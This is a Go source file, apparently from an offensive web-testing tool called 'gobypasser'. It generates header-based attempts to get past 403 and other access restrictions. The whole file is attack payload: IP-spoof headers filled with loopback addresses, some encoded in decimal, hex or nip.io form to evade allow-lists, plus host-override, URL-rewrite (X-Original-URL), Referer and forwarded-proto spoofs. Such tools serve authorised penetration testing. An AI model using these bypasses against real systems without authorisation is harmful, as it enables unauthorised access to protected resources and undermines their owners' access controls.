package gobypasser

// HeaderBypass is a single header-based bypass attempt.
//
// TargetPath controls where the request is sent:
//   - true  -> the request targets the protected resource ({base_url}/{base_path}),
//     spoofing the client's identity (IP-spoof, host-override, proto headers).
//   - false -> the request targets root ({base_url}/) and the header carries the
//     path, asking the upstream to rewrite it (URL-rewrite headers).
//
// Value templates support the placeholders {base_url} and {base_path}, which are
// substituted per-target at request time.
type HeaderBypass struct {
	Header     string
	Value      string
	TargetPath bool
}

// Header names, grouped by the role their value plays. See CONTEXT.md.
var (
	ipSpoofHeaders = []string{
		"X-Forwarded-For",
		"X-Real-IP",
		"X-Client-IP",
		"Client-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Originating-IP",
		"X-True-Client-IP",
		"True-Client-IP",
		"X-Custom-IP-Authorization",
		"Via",
	}

	hostOverrideHeaders = []string{
		"X-Forwarded-Host",
		"X-Forwarded-Server",
		"X-Host",
		"X-HTTP-Host-Override",
	}

	rewriteHeaders = []string{
		"X-Original-URL",
		"X-Rewrite-URL",
		"X-Override-URL",
	}
)

// Loopback values fed to IP-spoof headers. Includes obfuscated encodings that
// defeat naive allow-lists (decimal, hex, dotted-shorthand, nip.io).
var loopbackIPs = []string{
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"127.1",
	"0.0.0.0",
	"2130706433",
	"0x7f000001",
	"127.0.0.1.nip.io",
	"::1",
	"[::1]",
	"[::1]:80",
	"[::1]:443",
	"localhost",
	"localhost:80",
	"localhost:443",
}

// Loopback hosts fed to host-override headers (no bare IPv6/ports shorthand that
// a Host header would reject).
var loopbackHosts = []string{
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"localhost",
	"localhost:80",
	"[::1]",
}

// Fixed proto/scheme spoofs sent alongside the protected path.
var protoHeaders = []HeaderBypass{
	{Header: "X-Forwarded-Scheme", Value: "http", TargetPath: true},
	{Header: "X-Forwarded-Scheme", Value: "https", TargetPath: true},
	{Header: "X-Forwarded-Proto", Value: "http", TargetPath: true},
	{Header: "X-Forwarded-Proto", Value: "https", TargetPath: true},
	{Header: "X-Forwarded-Port", Value: "80", TargetPath: true},
	{Header: "X-Forwarded-Port", Value: "443", TargetPath: true},
}

// BuildHeaderBypasses expands the header groups into the full list of attempts.
func BuildHeaderBypasses() []HeaderBypass {
	var bypasses []HeaderBypass

	for _, hdr := range ipSpoofHeaders {
		for _, val := range loopbackIPs {
			bypasses = append(bypasses, HeaderBypass{Header: hdr, Value: val, TargetPath: true})
		}
	}

	for _, hdr := range hostOverrideHeaders {
		for _, val := range loopbackHosts {
			bypasses = append(bypasses, HeaderBypass{Header: hdr, Value: val, TargetPath: true})
		}
	}

	// URL-rewrite headers carry the path and are sent against root.
	for _, hdr := range rewriteHeaders {
		for _, val := range []string{"/{base_path}", "{base_path}", "/{base_path}/", "//{base_path}"} {
			bypasses = append(bypasses, HeaderBypass{Header: hdr, Value: val, TargetPath: false})
		}
	}

	// Referer spoofs the origin as the protected resource itself.
	bypasses = append(bypasses,
		HeaderBypass{Header: "Referer", Value: "{base_url}/{base_path}", TargetPath: true},
	)

	bypasses = append(bypasses, protoHeaders...)

	return bypasses
}

// AllBypassHeaderNames returns every header name this tool sets, for display
// matching in the results table.
func AllBypassHeaderNames() []string {
	names := make([]string, 0, len(ipSpoofHeaders)+len(hostOverrideHeaders)+len(rewriteHeaders)+4)
	names = append(names, ipSpoofHeaders...)
	names = append(names, hostOverrideHeaders...)
	names = append(names, rewriteHeaders...)
	names = append(names, "Referer", "X-Forwarded-Scheme", "X-Forwarded-Proto", "X-Forwarded-Port")
	return names
}
